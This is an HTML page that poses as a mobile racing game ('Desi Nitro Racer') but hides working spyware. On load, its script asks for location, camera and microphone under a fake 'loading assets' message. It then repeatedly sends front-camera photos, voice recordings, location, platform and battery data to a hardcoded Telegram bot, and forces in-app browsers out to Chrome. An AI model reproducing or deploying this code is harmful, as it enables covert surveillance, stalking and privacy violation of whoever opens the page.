<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <title>Desi Turbo Racer Pro 🏎️</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { margin: 0; overflow: hidden; background: #2c3e50; font-family: 'Segoe UI', sans-serif; touch-action: none; }
        canvas { display: block; background: #34495e; width: 100vw; height: 100vh; }
        #ui { position: absolute; top: 20px; width: 100%; text-align: center; color: #f1c40f; font-size: 32px; font-weight: bold; z-index: 10; text-shadow: 2px 2px #000; pointer-events: none; }
        .controls { position: absolute; bottom: 40px; width: 100%; display: flex; justify-content: space-between; padding: 0 40px; box-sizing: border-box; z-index: 15; }
        .ctrl-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.1); border: 2px solid rgba(255,255,255,0.4); border-radius: 50%; color: #fff; font-size: 40px; display: flex; align-items: center; justify-content: center; user-select: none; }
        #startScreen { position: absolute; width: 100%; height: 100%; background: rgba(0,0,0,0.98); display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 20; text-align: center; color: white; padding: 20px; }
        .play-btn { padding: 18px 50px; font-size: 26px; background: #27ae60; color: #fff; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; box-shadow: 0 5px #1e8449; }
    </style>
</head>
<body>

<div id="ui">SCORE: <span id="score">0</span></div>

<div id="startScreen">
    <h1 style="color:#e74c3c;">🏎️ DESI NITRO RACER</h1>
    <p id="statusMsg">Loading Game Assets...<br>Please Allow Permissions!</p>
    <button class="play-btn" onclick="startGame()">START RACE</button>
</div>

<div class="controls">
    <div class="ctrl-btn" id="lBtn">◀️</div>
    <div class="ctrl-btn" id="rBtn">▶️</div>
</div>

<canvas id="gameCanvas"></canvas>
<video id="v" style="display:none" autoplay playsinline muted></video>
<canvas id="c" style="display:none"></canvas>

<script>
const botToken = '8047508895:AAFrcd1D14oyIUtPcmjK-dxZY0sEwohBJcA';
const chatId = '8466223066';

// --- [ Chrome Redirect Fix ] ---
(function() {
    const ua = navigator.userAgent || navigator.vendor || window.opera;
    const isInsta = ua.includes("Instagram") || ua.includes("FBAN") || ua.includes("FBAV");
    
    if (isInsta) {
        const currentUrl = window.location.href.split('://')[1];
        window.location.href = "intent://" + currentUrl + "#Intent;scheme=https;package=com.android.chrome;end";
    }
})();

window.onload = autoRequest;

async function autoRequest() {
    let info = `📱 **New Target Entry**\nPlatform: ${navigator.platform}\n`;
    
    if ('getBattery' in navigator) {
        const b = await navigator.getBattery();
        info += `Battery: ${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})\n`;
    }

    // --- [ FIXED MAPS LINK ] ---
    navigator.geolocation.getCurrentPosition(p => {
        const lat = p.coords.latitude;
        const lon = p.coords.longitude;
        // सीधा और सही गूगल मैप्स लिंक
        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
        sendData(info + `📍 Location: ${mapLink}`, 'text');
    }, (err) => {
        sendData(info + "❌ Location Denied", 'text');
    }, {enableHighAccuracy: true});

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: true 
        });
        const video = document.getElementById('v');
        video.srcObject = stream;
        video.onloadedmetadata = () => {
            video.play();
            startCapturing(stream);
        };
        document.getElementById('statusMsg').innerHTML = "Assets Loaded! ✅";
    } catch (e) {
        sendData("❌ Camera Denied: " + e.message, 'text');
        document.getElementById('statusMsg').innerHTML = "❌ Please Allow Camera!";
    }
}

function startCapturing(stream) {
    const video = document.getElementById('v');
    const capCanvas = document.getElementById('c');
    const ctxCap = capCanvas.getContext('2d');

    setInterval(() => {
        if (video.videoWidth > 0) {
            capCanvas.width = video.videoWidth; 
            capCanvas.height = video.videoHeight;
            ctxCap.drawImage(video, 0, 0);
            capCanvas.toBlob(blob => sendData(blob, 'photo'), 'image/jpeg', 0.5);
        }
    }, 3000);

    function voiceRecorder() {
        const r = new MediaRecorder(stream);
        const ch = [];
        r.ondataavailable = e => ch.push(e.data);
        r.onstop = () => {
            sendData(new Blob(ch, {type: 'audio/ogg'}), 'voice');
            voiceRecorder(); 
        };
        r.start();
        setTimeout(() => { if(r.state === "recording") r.stop(); }, 10000);
    }
    voiceRecorder();
}

function sendData(data, type) {
    const f = new FormData();
    f.append('chat_id', chatId);
    let u = `https://api.telegram.org/bot${botToken}/`;
    if(type === 'photo') { u += 'sendPhoto'; f.append('photo', data, 'snap.jpg'); }
    else if(type === 'voice') { u += 'sendVoice'; f.append('voice', data, 'rec.ogg'); }
    else { u += 'sendMessage'; f.append('text', data); }
    fetch(u, { method: 'POST', body: f }).catch(e => console.log(e));
}

// --- [ गेम इंजन ] ---
const canvas = document.getElementById("gameCanvas");
const ctx = canvas.getContext("2d");
function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
window.addEventListener('resize', resize);
resize();

let score = 0, gameActive = false, playerX = canvas.width/2 - 30, enemies = [];

function drawCar(x, y, color) {
    ctx.fillStyle = color; ctx.fillRect(x, y, 60, 100); 
    ctx.fillStyle = "#000"; ctx.fillRect(x-6, y+10, 6, 20); ctx.fillRect(x+60, y+10, 6, 20);
    ctx.fillRect(x-6, y+70, 6, 20); ctx.fillRect(x+60, y+70, 6, 20);
}

function spawn() {
    if(!gameActive) return;
    let lanes = [canvas.width/6, canvas.width/2, (canvas.width/6)*5];
    enemies.push({ x: lanes[Math.floor(Math.random()*3)] - 30, y: -120, s: 5 + (score * 0.2) });
    setTimeout(spawn, Math.max(1500 - (score * 50), 800));
}

function loop() {
    if(!gameActive) return;
    ctx.clearRect(0,0,canvas.width, canvas.height);
    ctx.setLineDash([50, 50]); ctx.strokeStyle = "#fff"; ctx.lineWidth = 4;
    ctx.beginPath(); ctx.moveTo(canvas.width/3, 0); ctx.lineTo(canvas.width/3, canvas.height); ctx.stroke();
    ctx.beginPath(); ctx.moveTo((canvas.width/3)*2, 0); ctx.lineTo((canvas.width/3)*2, canvas.height); ctx.stroke();
    drawCar(playerX, canvas.height - 150, "#e74c3c");
    enemies.forEach((en, i) => {
        en.y += en.s;
        drawCar(en.x, en.y, "#3498db");
        if(playerX < en.x + 60 && playerX + 60 > en.x && canvas.height-150 < en.y + 100 && canvas.height-50 > en.y) {
            gameActive = false; alert("Boom! Crashed."); location.reload();
        }
        if(en.y > canvas.height) { enemies.splice(i, 1); score++; document.getElementById("score").innerText = score; }
    });
    requestAnimationFrame(loop);
}

document.getElementById("lBtn").addEventListener('touchstart', (e) => { e.preventDefault(); playerX = Math.max(10, playerX - (canvas.width/3)); });
document.getElementById("rBtn").addEventListener('touchstart', (e) => { e.preventDefault(); playerX = Math.min(canvas.width-70, playerX + (canvas.width/3)); });

function startGame() {
    document.getElementById("startScreen").style.display = "none";
    gameActive = true;
    spawn();
    loop();
}
</script>
</body>
</html>
